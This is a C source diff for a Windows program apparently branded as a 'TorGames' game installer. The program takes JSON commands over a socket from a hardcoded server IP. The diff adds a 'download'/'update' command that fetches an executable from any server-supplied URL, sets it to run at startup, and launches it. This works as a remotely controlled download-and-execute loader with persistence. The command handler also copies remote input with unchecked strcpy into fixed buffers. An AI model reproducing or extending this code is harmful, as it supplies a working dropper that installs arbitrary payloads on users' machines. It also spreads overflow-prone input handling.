@@ -14,6 +14,7 @@
 #include <Wbemidl.h>
 #include <bcrypt.h>
 #include <shlwapi.h>
+#include <winhttp.h>
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -27,6 +28,7 @@
 #pragma comment(lib, "oleaut32.lib")
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "winhttp.lib")
 
 // ============== Configuration ==============
 #define DEFAULT_SERVER "144.91.111.101"
@@ -436,6 +438,190 @@ BOOL RemoveInstallerStartupTask() {
     return r.success;
 }
 
+// ============== HTTP Download ==============
+BOOL DownloadFile(const char* url, const char* destPath) {
+    Log("Downloading: %s", url);
+    Log("Destination: %s", destPath);
+
+    // Parse URL
+    wchar_t wUrl[512];
+    MultiByteToWideChar(CP_UTF8, 0, url, -1, wUrl, 512);
+
+    URL_COMPONENTSW urlComp = {0};
+    urlComp.dwStructSize = sizeof(urlComp);
+    wchar_t hostName[256] = {0};
+    wchar_t urlPath[512] = {0};
+    urlComp.lpszHostName = hostName;
+    urlComp.dwHostNameLength = 256;
+    urlComp.lpszUrlPath = urlPath;
+    urlComp.dwUrlPathLength = 512;
+
+    if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
+        Log("Failed to parse URL: %lu", GetLastError());
+        return FALSE;
+    }
+
+    BOOL isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);
+    INTERNET_PORT port = urlComp.nPort ? urlComp.nPort : (isHttps ? 443 : 80);
+
+    // Open session
+    HINTERNET hSession = WinHttpOpen(L"TorGames.InstallerPlus/1.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        Log("WinHttpOpen failed: %lu", GetLastError());
+        return FALSE;
+    }
+
+    // Connect
+    HINTERNET hConnect = WinHttpConnect(hSession, hostName, port, 0);
+    if (!hConnect) {
+        Log("WinHttpConnect failed: %lu", GetLastError());
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    // Create request
+    DWORD flags = isHttps ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath, NULL,
+        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    if (!hRequest) {
+        Log("WinHttpOpenRequest failed: %lu", GetLastError());
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    // Send request
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
+        Log("WinHttpSendRequest failed: %lu", GetLastError());
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    // Receive response
+    if (!WinHttpReceiveResponse(hRequest, NULL)) {
+        Log("WinHttpReceiveResponse failed: %lu", GetLastError());
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    // Check status code
+    DWORD statusCode = 0;
+    DWORD statusSize = sizeof(statusCode);
+    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
+
+    if (statusCode != 200) {
+        Log("HTTP error: %lu", statusCode);
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    // Open output file
+    HANDLE hFile = CreateFileA(destPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Log("Failed to create file: %lu", GetLastError());
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    // Read and write data
+    DWORD bytesRead = 0;
+    DWORD totalBytes = 0;
+    char buffer[8192];
+    BOOL success = TRUE;
+
+    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+        DWORD bytesWritten;
+        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL)) {
+            Log("Failed to write file: %lu", GetLastError());
+            success = FALSE;
+            break;
+        }
+        totalBytes += bytesRead;
+    }
+
+    CloseHandle(hFile);
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    if (success) {
+        Log("Downloaded %lu bytes", totalBytes);
+    } else {
+        DeleteFileA(destPath);
+    }
+
+    return success;
+}
+
+// Download and run an executable (for updates/client installation)
+CmdResult DoDownloadAndRun(const char* url, const char* targetDir) {
+    CmdResult r = {0};
+
+    // Determine target directory
+    char target[MAX_PATH];
+    if (targetDir && targetDir[0]) {
+        strcpy(target, targetDir);
+    } else {
+        char pf[MAX_PATH];
+        ExpandEnvironmentStringsA("%ProgramFiles%", pf, MAX_PATH);
+        snprintf(target, sizeof(target), "%s\\TorGames", pf);
+    }
+
+    // Create directory
+    CreateDirectoryA(target, NULL);
+
+    // Determine filename from URL or use default
+    const char* filename = strrchr(url, '/');
+    filename = filename ? filename + 1 : "TorGames.Client.exe";
+
+    // Remove query string if present
+    char cleanFilename[256];
+    strncpy(cleanFilename, filename, sizeof(cleanFilename) - 1);
+    char* query = strchr(cleanFilename, '?');
+    if (query) *query = '\0';
+
+    char destPath[MAX_PATH];
+    snprintf(destPath, sizeof(destPath), "%s\\%s", target, cleanFilename);
+
+    // Download
+    if (!DownloadFile(url, destPath)) {
+        snprintf(r.error, sizeof(r.error), "Download failed");
+        return r;
+    }
+
+    // Create startup task for the downloaded client
+    CreateClientStartupTask(destPath);
+
+    // Remove installer startup task since client is now installed
+    RemoveInstallerStartupTask();
+
+    // Launch the downloaded executable
+    STARTUPINFOA si = {sizeof(si)};
+    PROCESS_INFORMATION pi;
+    if (CreateProcessA(destPath, NULL, NULL, NULL, FALSE, 0, NULL, target, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        Log("Launched: %s", destPath);
+    } else {
+        Log("Failed to launch: %lu", GetLastError());
+    }
+
+    r.success = TRUE;
+    snprintf(r.output, sizeof(r.output), "Downloaded and installed to %s", destPath);
+    return r;
+}
+
 // ============== Install/Uninstall ==============
 CmdResult DoInstall(const char* source, const char* targetDir) {
     CmdResult r = {0};
@@ -640,6 +826,19 @@ void HandleCommand(SOCKET s, const char* json) {
     }
     else if (strcmp(cmdType, "uninstall") == 0) {
         r = DoUninstall(cmdText);
+    }
+    else if (strcmp(cmdType, "download") == 0 || strcmp(cmdType, "update") == 0) {
+        // Download and run - cmdText is the URL, optionally followed by target dir
+        char url[512] = {0}, target[512] = {0};
+        char* space = strchr(cmdText, ' ');
+        if (space) {
+            *space = '\0';
+            strcpy(url, cmdText);
+            strcpy(target, space + 1);
+        } else {
+            strcpy(url, cmdText);
+        }
+        r = DoDownloadAndRun(url, target);
     }
     else {
         r.success = FALSE;
